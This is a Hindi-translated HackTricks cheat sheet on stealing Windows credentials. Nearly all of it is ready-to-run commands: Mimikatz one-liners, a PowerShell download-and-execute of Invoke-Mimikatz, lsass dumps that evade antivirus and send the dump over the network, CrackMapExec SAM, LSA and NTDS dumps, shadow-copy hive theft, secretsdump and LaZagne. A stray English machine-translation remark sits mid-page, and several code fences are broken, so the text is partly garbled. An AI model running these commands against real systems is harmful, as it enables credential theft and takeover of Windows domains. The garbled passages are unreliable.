# विंडोज क्रेडेंशियल्स चुराना

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

## क्रेडेंशियल्स Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz द्वारा और क्या किया जा सकता है, इसकी जानकारी के लिए** [**इस पृष्ठ पर**](credentials-mimikatz.md) **देखें।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**यहां कुछ संभावित प्रमाणीकरण सुरक्षा के बारे में जानें।**](credentials-protections.md) **यह सुरक्षा Mimikatz को कुछ प्रमाणीकरण निकालने से रोक सकती है।**

## Meterpreter के साथ प्रमाणीकरण

मैंने जो [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) बनाया है, उसका उपयोग करें **ताकि** पीड़ित के अंदर पासवर्ड और हैशेज **खोज सकें।**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

**Procdump** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **से एक वैध Microsoft टूल है**, इसलिए इसे Defender द्वारा पता नहीं लगाया जाता है।\
आप इस टूल का उपयोग **lsass प्रोसेस को डंप करने**, **डंप डाउनलोड करने** और **स्थानीय रूप से डंप से क्रेडेंशियल्स निकालने** के लिए कर सकते हैं।

{% code title="lsass डंप करना" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Since the provided text does not contain any English content that needs to be translated into Hindi, there is nothing to translate. The text is a part of markdown syntax and code block titles, which should not be translated as per the instructions.
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) के साथ स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**ध्यान दें**: कुछ **AV** **procdump.exe का उपयोग करके lsass.exe को डंप करने** को **हानिकारक** के रूप में **पहचान** सकते हैं, यह इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** शब्दों को **पहचान** रहे हैं। इसलिए यह **अधिक गुप्त** है कि **नाम lsass.exe के बजाय** procdump को **आर्ग्युमेंट** के रूप में lsass.exe का **PID** **पास** किया जाए।

### **comsvcs.dll** के साथ lsass को डंप करना

एक DLL है जिसका नाम **comsvcs.dll** है, जो `C:\Windows\System32` में स्थित है और यह **प्रक्रिया मेमोरी को डंप करता है** जब भी वे **क्रैश** होते हैं। इस DLL में एक **फंक्शन** है जिसका नाम **`MiniDumpW`** है जिसे `rundll32.exe` के साथ कॉल किया जा सकता है।\
पहले दो आर्ग्युमेंट्स का उपयोग नहीं किया जाता है, लेकिन तीसरा आर्ग्युमेंट तीन भागों में विभाजित होता है। पहला भाग वह प्रक्रिया ID है जिसे डंप किया जाएगा, दूसरा भाग डंप फाइल का स्थान है, और तीसरा भाग शब्द **full** है। और कोई विकल्प नहीं है।\
एक बार जब ये तीन आर्ग्युमेंट्स पार्स हो जाते हैं, बुनियादी रूप से यह DLL डंप फाइल बनाता है, और उस डंप फाइल में निर्दिष्ट प्रक्रिया को डंप करता है।\
इस फंक्शन की मदद से, हम **comsvcs.dll** का उपयोग करके lsass प्रक्रिया को डंप कर सकते हैं, procdump को अपलोड करने और उसे निष्पादित करने के बजाय। (यह जानकारी [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) से निकाली गई थी)
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
हमें केवल यह ध्यान रखना है कि यह तकनीक केवल **SYSTEM** के रूप में ही निष्पादित की जा सकती है।

**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy) **के साथ स्वचालित कर सकते हैं।**

### **Task Manager के साथ lsass डंप करना**

1. Task Bar पर राइट क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रक्रिया को खोजें
4. "Local Security Authority Process" प्रक्रिया पर राइट क्लिक करें और "Create dump file" पर क्लिक करें।

### procdump के साथ lsass डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक Microsoft हस्ताक्षरित बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो मेमोरी डंप को छुपाने और इसे डिस्क पर डाले बिना दूरस्थ कार्यस्थानों पर स्थानांतरित करने का समर्थन करता है।

**मुख्य कार्यक्षमताएं**:

1. PPL सुरक्षा को बायपास करना
2. Defender हस्ताक्षर-आधारित पता लगाने की तंत्रों से बचने के लिए मेमोरी डंप फाइलों को छुपाना
3. डिस्क पर डाले बिना RAW और SMB अपलोड विधियों के साथ मेमोरी डंप अपलोड करना (फाइललेस डंप)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM हैशेज को डंप करना
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA सीक्रेट्स डंप करना
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit डंप करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्षित DC से NTDS.dit पासवर्ड हिस्ट्री डंप करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet विशेषता दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM और SYSTEM चुराना

ये फाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन **आप उन्हें सामान्य तरीके से कॉपी नहीं कर सकते** क्योंकि वे सुरक्षित हैं।

### रजिस्ट्री से

उन फाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से एक प्रति प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**डाउनलोड** करें उन फाइलों को अपनी Kali मशीन पर और **हैशेज को निकालें** इसका उपयोग करते हुए:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### वॉल्यूम शैडो कॉपी

इस सेवा का उपयोग करके आप सुरक्षित फाइलों की प्रतिलिपि बना सकते हैं। आपको एडमिनिस्ट्रेटर होना चाहिए।

#### vssadmin का उपयोग करते हुए

vssadmin बाइनरी केवल Windows Server संस्करणों में उपलब्ध है
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप यही काम **Powershell** से भी कर सकते हैं। यह **SAM फाइल को कॉपी करने का उदाहरण** है (इस्तेमाल किया गया हार्ड ड्राइव "C:" है और इसे C:\users\Public में सेव किया गया है) लेकिन आप इसे किसी भी सुरक्षित फाइल को कॉपी करने के लिए उपयोग कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

अंत में, आप [**PS स्क्रिप्ट Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की प्रतिलिपि बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**Ntds.dit फ़ाइल एक डेटाबेस है जो Active Directory डेटा को संग्रहीत करती है**, जिसमें उपयोगकर्ता ऑब्जेक्ट्स, समूहों और समूह सदस्यता की जानकारी शामिल है। इसमें डोमेन के सभी उपयोगकर्ताओं के पासवर्ड हैश शामिल होते हैं।

महत्वपूर्ण NTDS.dit फ़ाइल **स्थित होगी**: _%SystemRoom%/NTDS/ntds.dit_\
यह फ़ाइल एक _Extensible Storage Engine_ (ESE) डेटाबेस है और "आधिकारिक रूप से" 3 तालिकाओं द्वारा बनाई गई है:

* **Data Table**: ऑब्जेक्ट्स (उपयोगकर्ता, समूह...) के बारे में जानकारी शामिल है।
* **Link Table**: संबंधों के बारे में जानकारी (सदस्य का...)
* **SD Table**: प्रत्येक ऑब्जेक्ट के सुरक्षा विवरण शामिल हैं।

इसके बारे में अधिक जानकारी: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows _Ntdsa.dll_ का उपयोग करके उस फ़ाइल के साथ इंटरैक्ट करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। फिर, **NTDS.dit** फ़ाइल का **भाग** **`lsass`** मेमोरी के **अंदर स्थित** हो सकता है (आपको शायद **कैश** का उपयोग करके प्रदर्शन में सुधार के कारण नवीनतम पहुँच वाले डेटा मिल सकते हैं)।

#### NTDS.dit के अंदर हैश को डिक्रिप्ट करना

हैश को 3 बार साइफर किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके पासवर्ड एन्क्रिप्शन की (**PEK**) को डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके **हैश** को डिक्रिप्ट करें।
3. **DES** का उपयोग करके **हैश** को डिक्रिप्ट करें।

**PEK** में **हर डोमेन कंट्रोलर** में **समान मूल्य** होता है, लेकिन यह **NTDS.dit** फ़ाइल के अंदर **BOOTKEY** का उपयोग करके **साइफर** किया जाता है, जो **डोमेन कंट्रोलर की SYSTEM फ़ाइल (डोमेन कंट्रोलर्स के बीच अलग होती है)**। इसीलिए NTDS.dit फ़ाइल से क्रेडेंशियल्स प्राप्त करने के लिए **आपको NTDS.dit और SYSTEM फ़ाइलें चाहिए** (_C:\Windows\System32\config\SYSTEM_)।

### Ntdsutil का उपयोग करके NTDS.dit की प्रतिलिपि बनाना

Windows Server 2008 से उपलब्ध है।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) की चाल का उपयोग करके **ntds.dit** फाइल की प्रतिलिपि भी बना सकते हैं। याद रखें कि आपको **SYSTEM फाइल** की एक प्रति की भी आवश्यकता होगी (फिर से, [**रजिस्ट्री से डंप करें या वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) की चाल का उपयोग करें)।

### **NTDS.dit से हैशेज निकालना**

एक बार जब आप **NTDS.dit** और **SYSTEM** फाइलें प्राप्त कर लेते हैं, तो आप _secretsdump.py_ जैसे उपकरणों का उपयोग करके **हैशेज निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक मान्य डोमेन एडमिन यूजर का उपयोग करके **स्वचालित रूप से उन्हें निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
### **NTDS.dit से डोमेन ऑब्जेक्ट्स को SQLite डेटाबेस में निकालना**

NTDS ऑब्जेक्ट्स को SQLite डेटाबेस में [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) का उपयोग करके निकाला जा सकता है। केवल सीक्रेट्स ही नहीं निकाले जाते, बल्कि पूरे ऑब्जेक्ट्स और उनके एट्रिब्यूट्स भी निकाले जाते हैं ताकि जब कच्ची NTDS.dit फाइल पहले से ही प्राप्त हो जाए, तो आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
```
`SYSTEM` हाइव वैकल्पिक है लेकिन यह रहस्यों के डिक्रिप्शन की अनुमति देता है (NT & LM हैशेज, अतिरिक्त क्रेडेंशियल्स जैसे कि क्लियरटेक्स्ट पासवर्ड, केर्बेरोस या ट्रस्ट कीज, NT & LM पासवर्ड हिस्ट्रीज). इसके साथ ही अन्य जानकारी, निम्नलिखित डेटा निकाला जाता है: यूजर और मशीन अकाउंट्स उनके हैशेज के साथ, UAC फ्लैग्स, आखिरी लॉगऑन और पासवर्ड बदलाव के लिए टाइमस्टैम्प, अकाउंट्स का विवरण, नाम, UPN, SPN, समूह और पुनरावृत्ति सदस्यता, संगठनात्मक इकाइयों का वृक्ष और सदस्यता, विश्वसनीय डोमेन्स उनके ट्रस्ट प्रकार, दिशा और गुणों के साथ...

## Lazagne

बाइनरी को [यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से डाउनलोड करें। आप इस बाइनरी का उपयोग कई सॉफ्टवेयर से क्रेडेंशियल्स निकालने के लिए कर सकते हैं।
```
```
lazagne.exe all
```
## SAM और LSASS से क्रेडेंशियल्स निकालने के लिए अन्य टूल्स

### Windows credentials Editor (WCE)

यह टूल मेमोरी से क्रेडेंशियल्स निकालने के लिए इस्तेमाल किया जा सकता है। इसे यहाँ से डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से प्रमाण-पत्र निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से डाउनलोड करें: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) और बस **इसे चलाएं** और पासवर्ड निकाले जाएंगे।

## बचाव

[**यहाँ कुछ प्रमाणीकरण सुरक्षा के बारे में जानें।**](credentials-protections.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
